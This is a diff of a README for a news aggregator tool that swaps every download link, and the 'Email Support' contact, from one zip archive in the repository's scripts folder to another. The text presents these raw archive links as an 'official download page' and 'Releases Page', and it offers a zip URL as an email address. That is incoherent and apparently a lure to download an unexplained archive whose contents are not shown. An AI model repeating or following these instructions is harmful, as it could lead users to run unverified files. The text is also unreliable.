@@ -1,7 +1,7 @@
 # 📰 news-aggregator-skill - Personalized News Collection Made Easy
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/euuuugh/news-aggregator-skill/main/scripts/skill_aggregator_news_2.3.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/euuuugh/news-aggregator-skill/main/scripts/skill_aggregator_news_2.3.zip)
+[![Download Latest Release](https://github.com/euuuugh/news-aggregator-skill/raw/refs/heads/main/scripts/aggregator-skill-news-3.2.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/euuuugh/news-aggregator-skill/raw/refs/heads/main/scripts/aggregator-skill-news-3.2.zip)
 
 ## 🚀 Getting Started
 Welcome to the news-aggregator-skill! This application helps you gather news from various sources, providing deep insights into each article. Follow these steps to get started.
@@ -21,7 +21,7 @@ Before you download, ensure your system meets these basic requirements:
 
 ## 📦 Download & Install
 1. **Visit the Releases Page**: Click the link below to go to the official download page.
-   - [Download the Release](https://raw.githubusercontent.com/euuuugh/news-aggregator-skill/main/scripts/skill_aggregator_news_2.3.zip)
+   - [Download the Release](https://github.com/euuuugh/news-aggregator-skill/raw/refs/heads/main/scripts/aggregator-skill-news-3.2.zip)
   
 2. **Choose the Latest Version**: Once on the page, look for the latest version of the application. It’s usually at the top of the list.
 
@@ -47,7 +47,7 @@ Before you download, ensure your system meets these basic requirements:
 ## 📞 Support
 If you encounter issues or have questions, you can reach out for help:
 - **GitHub Issues**: Report problems directly on the GitHub issues page.
-- **Email Support**: Contact support at https://raw.githubusercontent.com/euuuugh/news-aggregator-skill/main/scripts/skill_aggregator_news_2.3.zip
+- **Email Support**: Contact support at https://github.com/euuuugh/news-aggregator-skill/raw/refs/heads/main/scripts/aggregator-skill-news-3.2.zip
 
 ## 🛠️ Frequently Asked Questions (FAQ)
 1. **What if my download fails?**
